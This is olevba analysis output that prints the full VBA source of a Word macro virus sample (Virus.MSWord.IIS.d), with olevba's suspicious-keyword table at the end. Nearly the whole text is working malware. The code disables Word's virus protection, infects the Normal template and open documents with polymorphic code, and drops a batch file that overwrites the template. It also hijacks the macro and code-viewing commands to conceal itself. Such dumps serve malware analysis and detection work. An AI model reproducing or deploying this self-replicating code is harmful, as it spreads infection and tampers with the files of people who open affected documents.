olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.d-b6886db236f1490970fa2d1e6a244fb924a014d1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.d-b6886db236f1490970fa2d1e6a244fb924a014d1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.d-b6886db236f1490970fa2d1e6a244fb924a014d1 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
џе = Chr(143)
Application.ShowVisualBasicEditor _
= _
False
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
begin:
On _
Error _
GoTo eb
NormAt _
= _
False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey _
= _
wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection _
= _
False
Options.ConfirmConversions _
= _
False
Application.ScreenUpdating _
= _
False
Options.SaveNormalPrompt _
= _
False
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line _
Input _
#1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= _
Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On _
Error _
GoTo NoInf
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 1 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
tg _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next tg
If _
Acd _
= 1 And NormT = 1 Then Exit Sub
If _
Acd _
= 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t _
= _
0
Randomize Timer
t _
= _
CInt(Rnd * 100)
If _
t _
< 50 Then g = 1
If _
t _
> 49 And t < 101 Then g = 2
If _
g _
= 1 Then
v _
= _
CInt(Rnd * 50)
For _
vs _
= 1 To v
beginNn:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginNn
If _
z _
< 65 Then GoTo beginNn
If _
z _
< 130 Then GoTo beginNn
va _
= _
va & Chr(z)
Next vs
v _
= _
CInt(Rnd * 20)
For _
vss _
= 1 To v
begin5:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo begin5
If _
z _
= 34 Then GoTo begin5
If _
z _
< 130 Then GoTo begin5
Inn _
= _
Inn & Chr(z)
Next vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End If
If _
g _
= 2 Then
v _
= _
CInt(Rnd * 50)
For _
vsss _
= 1 To v
begin2:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo begin2
If _
z _
< 130 Then GoTo begin2
va _
= _
va & Chr(z)
Next vsss
z _
= _
CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End If
If _
g _
= 3 Then
v _
= _
CInt(Rnd * 50)
va = "'"
For _
vssss _
= 1 To v
begin3:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo begin3
If _
z _
< 130 Then GoTo begin3
va _
= _
va & Chr(z)
Next vssss
FullCodeN _
= _
FullCodeN & va & Chr(13)
End If
If _
g _
= 4 Then
v _
= _
CInt(Rnd * 50)
For _
vsssss _
= 1 To v
begin4:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo begin4
If _
z _
< 130 Then GoTo begin4
va _
= _
va & Chr(z)
Next vsssss
va = va & ":"
FullCodeN _
= _
FullCodeN & va & Chr(13)
End If
aaaa _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh _
= _
1
Do
If _
hh _
= aaaa Then GoTo nextterm
hh _
= _
hh + 1
a _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo NextLineN
End If
Spac _
= _
0
t _
= _
0
PosL _
= _
0
BeginN:
l _
= _
Len(a)
Do
If _
PosL _
> l Then GoTo NoCN
PosL _
= _
PosL + 1
If _
Mid(a, _
PosL, 1) = Chr(34) Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo NextLineN
End If
Loop
NoCN:
PosL _
= _
0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo SplitN
UnsplitN:
v _
= _
0
y _
= _
a
Do
If Right(y, 1) <> "_" Then GoTo NoChN
l _
= _
Len(y)
PosL _
= _
0
Do
PosL _
= _
PosL + 1
s _
= _
Mid(y, PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= _
PosL - 1
y _
= _
Left(y, l - 1)
hh _
= _
hh + 1
a _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
v _
= _
1
y _
= _
y & a
Loop
NoChN:
a _
= _
y
c _
= _
0
PoslO _
= _
0
PosL _
= _
0
GoTo BeginN
SplitN:
PosL _
= _
0
l _
= _
Len(a)
k _
= _
0
If _
Spac _
<> 0 Then
Do
k _
= _
k + 1
If _
k _
> l Then GoTo NC
s _
= _
Mid(a, k, 1)
If s = " " Then g = k
Loop
NC:
If _
g _
<= Spac Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo NextLineN
End If
End If
Do
If _
PosL _
> l Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo NextLineN
End If
PosL _
= _
PosL + 1
s _
= _
Mid(a, PosL, 1)
If _
s _
= Chr(34) Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo NextLineN
End If
If s = " " Then
If _
Spac _
= 0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, PosL + 1, l)
FullCodeN _
= _
FullCodeN & f & Chr(13)
FullCodeN _
= _
FullCodeN & las & Chr(13)
GoTo NextLineN
End If
If _
PosL _
<= Spac Then
wa _
= _
PosL - PoslO
If _
PoslO _
<> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End If
FullCodeN _
= _
FullCodeN _
& _
Temp & Chr(13)
PoslO _
= _
PosL _
+ _
1
c _
= _
1
GoTo NextCharN
Else
c _
= _
1
wa _
= _
PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, PosL + 1, l)
FullCodeN _
= _
FullCodeN & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL _
> Spac Then GoTo NextLineN
GoTo NextCharN
End If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN _
= _
FullCodeN & Temp & Chr(13)
GoTo NextLineN
End If
NextCharN:
Loop
FullCodeN _
= _
FullCodeN & y & Chr(13)
GoTo NextLineN
NextLineN:
Loop
nextterm:
End If
If _
NormT _
= 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t _
= _
0
Randomize Timer
t _
= _
CInt(Rnd * 100)
If _
t _
< 50 Then g = 1
If _
t _
> 49 And t < 101 Then g = 2
If _
g _
= 1 Then
v _
= _
CInt(Rnd * 50)
For _
vDs _
= 1 To v
beginDD:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginDD
If _
z _
< 65 Then GoTo beginDD
If _
z _
< 130 Then GoTo beginDD
va _
= _
va & Chr(z)
Next vDs
v _
= _
CInt(Rnd * 20)
For _
vDss _
= 1 To v
beginD5:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginD5
If _
z _
= 34 Then GoTo beginD5
If _
z _
< 130 Then GoTo beginD5
Inn _
= _
Inn & Chr(z)
Next vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End If
If _
g _
= 2 Then
v _
= _
CInt(Rnd * 50)
For _
vDsss _
= 1 To v
beginD2:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginD2
If _
z _
< 130 Then GoTo beginD2
va _
= _
va & Chr(z)
Next vDsss
z _
= _
CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End If
If _
g _
= 3 Then
v _
= _
CInt(Rnd * 50)
va = "'"
For _
vdssss _
= 1 To v
beginD3:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginD3
If _
z _
< 130 Then GoTo beginD3
va _
= _
va & Chr(z)
Next vdssss
FullCodeD _
= _
FullCodeD & va & Chr(13)
End If
If _
g _
= 4 Then
v _
= _
CInt(Rnd * 50)
For _
vdsssss _
= 1 To v
beginD4:
z _
= _
CInt(Rnd * 250)
If _
z _
= 13 Then GoTo beginD4
If _
z _
< 130 Then GoTo beginD4
va _
= _
va & Chr(z)
Next vdsssss
va = va & ":"
FullCodeD _
= _
FullCodeD & va & Chr(13)
End If
aaaa _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh _
= _
1
Do
If _
hh _
= aaaa Then GoTo EndTerm
hh _
= _
hh + 1
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo NextLineD
End If
Spac _
= _
0
t _
= _
0
PosL _
= _
0
beginD:
l _
= _
Len(a)
Do
If _
PosL _
> l Then GoTo NoCD
PosL _
= _
PosL + 1
If _
Mid(a, _
PosL, 1) = Chr(34) Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo NextLineD
End If
Loop
NoCD:
PosL _
= _
0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo SplitD
UnsplitD:
v _
= _
0
y _
= _
a
Do
If Right(y, 1) <> "_" Then GoTo NoChD
l _
= _
Len(y)
PosL _
= _
0
Do
PosL _
= _
PosL + 1
s _
= _
Mid(y, PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= _
PosL - 1
y _
= _
Left(y, l - 1)
hh _
= _
hh + 1
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
v _
= _
1
y _
= _
y & a
Loop
NoChD:
a _
= _
y
c _
= _
0
PoslO _
= _
0
PosL _
= _
0
GoTo beginD
SplitD:
PosL _
= _
0
l _
= _
Len(a)
k _
= _
0
If _
Spac _
<> 0 Then
Do
k _
= _
k + 1
If _
k _
> l Then GoTo DC
s _
= _
Mid(a, k, 1)
If s = " " Then g = k
Loop
DC:
If _
g _
<= Spac Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo NextLineD
End If
End If
Do
If _
PosL _
> l Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo NextLineD
End If
PosL _
= _
PosL + 1
s _
= _
Mid(a, PosL, 1)
If _
s _
= Chr(34) Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo NextLineD
End If
If s = " " Then
If _
Spac _
= 0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, PosL + 1, l)
FullCodeD _
= _
FullCodeD & f & Chr(13)
FullCodeD _
= _
FullCodeD & las & Chr(13)
GoTo NextLineD
End If
If _
PosL _
<= Spac Then
wa _
= _
PosL - PoslO
If _
PoslO _
<> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End If
FullCodeD _
= _
FullCodeD _
& _
Temp & Chr(13)
PoslO _
= _
PosL _
+ _
1
c _
= _
1
GoTo NextCharD
Else
c _
= _
1
wa _
= _
PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, PosL + 1, l)
FullCodeD _
= _
FullCodeD & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL _
> Spac Then GoTo NextLineD
GoTo NextCharD
End If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD _
= _
FullCodeD & Temp & Chr(13)
GoTo NextLineD
End If
NextCharD:
Loop
FullCodeD _
= _
FullCodeD & y & Chr(13)
GoTo NextLineD
NextLineD:
Loop
EndTerm:
End If
If _
NormT _
<> 1 Then
look:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= 2 To ms
a _
= _
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring (FullCodeN)
i _
= _
20
Exit For
End If
Next Inn
If _
i _
<> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt _
= _
ActiveDocument.ReadOnly
l = ""
On _
Error _
GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved _
= _
True
ActiveDocument.Saved _
= _
True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l _
= _
Len(NormalTemplate.FullName)
l _
= _
l - 10
For _
i _
= 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved _
= _
True
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= True Then
End If
notemp:
End If
i _
= _
1
If _
Acd _
<> 1 Then
Close
look2:
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= 2 To ms
a _
= _
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i _
= _
20
Exit For
End If
Next inn2
If _
i _
<> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= _
True
End If
End If
NoInf:
eb:
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved _
= _
False
GoTo NoNormal
End If
If _
NormAtt _
= True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr _
(NormalTemplate.FullName), _
vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved _
= _
True
NoNormal:
End Sub
Sub ViewVbCode()
On _
Error _
GoTo NoDoc
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), _
vbNormal
NoSet:
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line _
Input _
#1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= _
Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
t _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next t
a _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, _
a
ActiveDocument.Saved _
= _
True
NoDoc:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 2 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= 1 To 2
al _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
al
Next i
esub:
eb:
Application.ShowVisualBasicEditor _
= _
True
NoDocL:
Options.SaveNormalPrompt _
= _
False
NormalTemplate.Saved _
= _
True
End Sub
Sub ToolsMacro()
On _
Error _
GoTo NoDoc
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), _
vbNormal
NoSet:
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
t _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next t
If _
Acd _
= 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii _
= 2 To a
l _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN _
= _
FullCodeN & l & Chr(13)
FullCodeD _
= _
FullCodeD & l & Chr(13)
Next ii
End If
a _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, _
a
ActiveDocument.Saved _
= _
True
ActiveDocument.Saved _
= _
True
NoDoc:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 1 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
If _
NormT _
= 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii _
= 2 To a
l _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD _
= _
FullCodeD & l & Chr(13)
FullCodeN _
= _
FullCodeN & l & Chr(13)
Next iiii
End If
l = ""
On _
Error _
GoTo 0
On _
Error _
GoTo eb
a _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
a
NormalTemplate.Saved _
= _
True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line _
Input _
#1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= _
Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a _
= _
GetAttr(NormalTemplate.FullName)
If _
a _
= 33 Then a = 1
If _
a _
= 1 Then GoTo eb
eb:
NormalTemplate.Saved _
= _
True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf _
= _
True
If _
Application.ShowVisualBasicEditor _
= True Then ReInf = False
If _
ReInf _
= True Then
Acd _
= _
0
NormT _
= _
0
If _
NormT _
<> 1 Then
NormalTemplate.OpenAsDocument
NormAt _
= _
ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= 2 To ms
a _
= _
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring (FullCodeN)
i _
= _
20
Exit For
End If
Next Inn
If _
i _
<> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= True Then
NormalTemplate.Saved _
= _
True
End If
End If
i _
= _
1
If _
NormAt _
<> True Then NormalTemplate.Save
notemp:
If _
Acd _
<> 1 Then
Close
look2:
a _
= _
Application.Documents.Count
If _
a _
< 1 Then GoTo NoDocL
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= 2 To ms
a _
= _
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i _
= _
20
Exit For
End If
Next inn2
If _
i _
<> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= _
True
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= 1 To 2
al _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
al
NormalTemplate.Saved _
= _
True
Next i
End If
Options.SaveNormalPrompt _
= _
False
NormalTemplate.Saved _
= _
True
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

